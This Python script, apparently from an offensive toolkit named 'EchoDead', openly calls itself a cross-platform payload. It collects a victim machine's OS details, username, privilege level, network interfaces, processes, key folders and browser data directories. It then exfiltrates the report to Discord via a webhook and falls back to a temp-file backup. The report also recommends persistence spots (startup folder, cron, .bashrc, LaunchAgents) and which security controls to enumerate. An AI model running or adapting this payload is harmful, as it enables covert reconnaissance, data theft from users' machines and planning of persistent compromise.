#!/usr/bin/env python3
"""
Universal Cross-Platform System Information Payload
Works on Windows, Linux, and macOS
"""

import sys
from pathlib import Path

# Add parent directory to path
parent_dir = Path(__file__).parent.parent
sys.path.insert(0, str(parent_dir))
sys.path.insert(0, str(parent_dir / 'src'))

try:
    from platform_utils import (
        PlatformDetector, 
        CrossPlatformCommand, 
        PathHelper
    )
    from webhook_utils import send_to_discord
except ImportError as e:
    print(f"Error importing modules: {e}")
    sys.exit(1)


def gather_universal_info():
    """
    Gather system information that works on all platforms
    """
    print("[*] Detecting platform...")
    
    # Platform detection
    os = PlatformDetector.get_os()
    info = PlatformDetector.get_detailed_info()
    is_admin = PlatformDetector.is_admin()
    
    print(f"[*] Platform detected: {os.upper()}")
    
    # Cross-platform commands
    username = CrossPlatformCommand.get_username()
    hostname = CrossPlatformCommand.get_hostname()
    
    # Network interfaces
    print("[*] Gathering network information...")
    interfaces = CrossPlatformCommand.get_network_interfaces()
    
    # Get process list
    print("[*] Gathering process information...")
    processes = CrossPlatformCommand.get_process_list()[:10]  # First 10 processes
    
    # Cross-platform paths
    print("[*] Gathering path information...")
    home = PlatformDetector.get_home_dir()
    temp = PlatformDetector.get_temp_dir()
    startup = PathHelper.get_startup_dir()
    documents = PathHelper.get_documents_dir()
    downloads = PathHelper.get_downloads_dir()
    
    # Browser directories
    browsers = PathHelper.get_browser_data_dirs()
    
    # Build comprehensive message
    emoji = {
        'windows': '🪟',
        'linux': '🐧',
        'macos': '🍎',
        'unknown': '❓'
    }
    
    platform_emoji = emoji.get(os, '❓')
    
    message = f"""
{platform_emoji} **UNIVERSAL CROSS-PLATFORM RECONNAISSANCE**

**═══════════════════════════════════════**
**PLATFORM INFORMATION**
**═══════════════════════════════════════**
• Operating System: **{info['system']} {info['release']}**
• Platform: **{os.upper()}**
• Version: {info['version']}
• Hostname: **{hostname}**
• Username: **{username}**
• Privilege Level: **{'👑 ADMIN/ROOT' if is_admin else '👤 STANDARD USER'}**

**═══════════════════════════════════════**
**HARDWARE INFORMATION**
**═══════════════════════════════════════**
• Architecture: {info['architecture']}
• Machine: {info['machine']}
• Processor: {info['processor'][:60]}
• 64-bit: {'✅ Yes' if info['is_64bit'] else '❌ No'}

**═══════════════════════════════════════**
**NETWORK INTERFACES**
**═══════════════════════════════════════**
"""
    
    if interfaces:
        for iface, ip in list(interfaces.items())[:5]:  # First 5 interfaces
            message += f"• {iface}: {ip}\n"
    else:
        message += "• No interfaces detected\n"
    
    message += f"""
**═══════════════════════════════════════**
**RUNNING PROCESSES** (Top 10)
**═══════════════════════════════════════**
"""
    
    for proc in processes[:10]:
        if 'name' in proc:
            message += f"• {proc['name']} (PID: {proc.get('pid', 'N/A')})\n"
    
    message += f"""
**═══════════════════════════════════════**
**FILE SYSTEM PATHS**
**═══════════════════════════════════════**
• Home Directory: `{home}`
• Temp Directory: `{temp}`
• Startup Folder: `{startup or 'Not found'}`
• Documents: `{documents}`
• Downloads: `{downloads}`

**═══════════════════════════════════════**
**BROWSER DATA DIRECTORIES**
**═══════════════════════════════════════**
"""
    
    if browsers:
        for browser, path in browsers.items():
            message += f"• {browser.title()}: `{path}`\n"
    else:
        message += "• No browser data directories found\n"
    
    message += f"""
**═══════════════════════════════════════**
**PYTHON ENVIRONMENT**
**═══════════════════════════════════════**
• Python Version: {info['python_version']}
• Platform Module: {info['system']}

**═══════════════════════════════════════**
**DEPLOYMENT RECOMMENDATIONS**
**═══════════════════════════════════════**
"""
    
    if os == 'windows':
        message += """
• ✅ Use Windows-specific payloads (registry, WMI, PowerShell)
• ✅ Target startup folder for persistence
• ✅ Check for UAC status
• ✅ Enumerate Windows Defender status
"""
    elif os == 'linux':
        message += """
• ✅ Use Linux-specific payloads (bash, systemd, cron)
• ✅ Check for sudo access
• ✅ Target .bashrc or cron for persistence
• ✅ Enumerate SELinux/AppArmor status
"""
    elif os == 'macos':
        message += """
• ✅ Use macOS-specific payloads (LaunchAgents, defaults)
• ✅ Check SIP and Gatekeeper status
• ✅ Target Launch Agents for persistence
• ✅ Enumerate FileVault status
"""
    
    message += """
**═══════════════════════════════════════**

🎯 **Cross-platform reconnaissance complete**
💀 **EchoDead Universal Payload v3.0**
"""
    
    return message


def main():
    """Main execution function"""
    print("=" * 70)
    print("ECHODEAD UNIVERSAL CROSS-PLATFORM PAYLOAD")
    print("=" * 70)
    
    try:
        # Gather information
        message = gather_universal_info()
        
        # Display locally
        print("\n[*] Reconnaissance Summary:")
        print("-" * 70)
        print(message)
        print("-" * 70)
        
        # Exfiltrate to Discord
        print("\n[*] Exfiltrating to Discord...")
        success = send_to_discord(message)
        
        if success:
            print("✅ Data successfully exfiltrated to Discord!")
        else:
            print("❌ Failed to send data to Discord")
            # Save locally as backup
            backup_file = Path(PlatformDetector.get_temp_dir()) / 'universal_recon.txt'
            with open(backup_file, 'w', encoding='utf-8') as f:
                f.write(message)
            print(f"✅ Data saved locally to {backup_file}")
    
    except Exception as e:
        print(f"❌ Error during reconnaissance: {str(e)}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "=" * 70)
    print("Reconnaissance complete!")
    print("=" * 70)


if __name__ == "__main__":
    main()
